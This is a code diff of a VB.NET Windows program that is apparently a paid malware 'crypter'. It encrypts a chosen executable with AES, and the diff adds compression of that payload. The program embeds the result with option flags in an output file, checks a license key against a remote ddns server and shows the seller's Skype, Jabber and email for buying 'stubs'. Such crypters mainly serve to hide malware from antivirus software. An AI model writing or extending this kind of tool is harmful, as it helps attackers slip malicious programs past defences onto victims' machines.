@@ -23,7 +23,6 @@ Public Class Form1
         Dim bytes(0 To hex.Length / 2 - 1) As Byte
         Dim a As Integer = 0
         For i = 0 To hex.Length - 1 Step 2
-            ' Console.WriteLine(hex.Substring(i, 2))
             Dim f = hex.Substring(i, 2)
             bytes(a) = "&h" & f
             a += 1
@@ -325,7 +324,7 @@ Public Class Form1
 
         Dim StubStr As String = "http://intellisence.ddns.net/Crypter/index.php"
         Dim WC As New System.Net.WebClient
-        StubStr = WC.DownloadString(StubStr & "?key=" & HWID.GetID() & "&list_users=fuckingtrue")
+        StubStr = WC.DownloadString(StubStr & "?key=" & HWID.GetID & "&list_users=fuckingtrue")
         If StubStr.Contains("WRONG KEY OR NO KEYS EXIST") Then
             MsgBox("You will need to purchase stubs to use the crypter! Please contact exidous!" & Environment.NewLine & "Skype: exidous1" & Environment.NewLine & "Jabber: exidous@jabb3r.org" & Environment.NewLine & "Email: exidous2008@gmail.com" & Environment.NewLine & "Your hardware id has been copied to the clipboard!" & Environment.NewLine & "HWID: " & HWID.GetID)
             Clipboard.Clear()
@@ -361,13 +360,20 @@ Public Class Form1
             End If
             If AngelCheckBox7.Checked = True Then
                 FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
+                If AngelCheckBox8.Checked = True Then
+                    FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("T"), True)
+                Else
+                    FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
+                End If
             Else
+                FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
                 FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("F"), True)
             End If
 
+
             FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
 
-            FileIO.FileSystem.WriteAllBytes(SFD.FileName, AES_Encrypt(FileIO.FileSystem.ReadAllBytes(AngelTextBox1.Text)), True)
+            FileIO.FileSystem.WriteAllBytes(SFD.FileName, Compress(AES_Encrypt(FileIO.FileSystem.ReadAllBytes(AngelTextBox1.Text))), True)
             FileIO.FileSystem.WriteAllBytes(SFD.FileName, TringToUnicodeBytes("!@!"), True)
             Application.DoEvents()
             System.Threading.Thread.Sleep(50)
@@ -537,6 +543,18 @@ Public Class Form1
             SignFile(SFD.FileName)
         End If
         MsgBox("Saved As " & SFD.FileName)
+    End Sub
+
+    Private Sub AngelCheckBox7_CheckedChanged(sender As Object) Handles AngelCheckBox7.CheckedChanged
+        If AngelCheckBox7.Checked = False Then
+            If AngelCheckBox8.Checked = True Then
+                AngelCheckBox8.Checked = False
+
+            End If
+            AngelCheckBox8.Enabled = False
+        Else
+            AngelCheckBox8.Enabled = True
+        End If
     End Sub
 End Class
 
